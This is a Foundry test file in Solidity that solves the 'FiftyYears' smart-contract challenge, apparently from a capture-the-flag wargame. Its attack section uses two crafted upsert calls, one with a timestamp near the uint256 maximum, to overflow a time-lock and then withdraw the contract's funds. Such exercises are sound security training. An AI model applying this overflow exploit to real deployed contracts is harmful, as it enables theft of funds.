// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/math/FiftyYears.sol";
import "forge-std/console.sol";

// forge test --match-contract FiftyYearsTest -vvvv
contract FiftyYearsTest is Test {
    address player = address(100);
    address player2 = address(200);

    function setUp() public {
        vm.deal(player, 5 ether);
    }

    function testFiftyYearsHack() public {
        /****************
         * Factory setup *
         *************** */
        FiftyYearsChallenge fiftyYearsChallenge = new FiftyYearsChallenge{value: 1 ether}(player);
        vm.startPrank(player);
        address payable levelAddress = payable(address(fiftyYearsChallenge));
        uint256 initialPlayerBalance = player.balance;
        assertEq(initialPlayerBalance, 5 ether);
        /****************
         *    Attack     *
         *************** */
        /*
         * Goal:
         */
        fiftyYearsChallenge.upsert{value: 1}(666, type(uint256).max - 1 days + 1);
        fiftyYearsChallenge.upsert{value: 1}(666, 0);
        fiftyYearsChallenge.withdraw(1);

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = fiftyYearsChallenge.isComplete();
        vm.stopPrank();
        // assert(levelSuccessfullyPassed);
    }
}
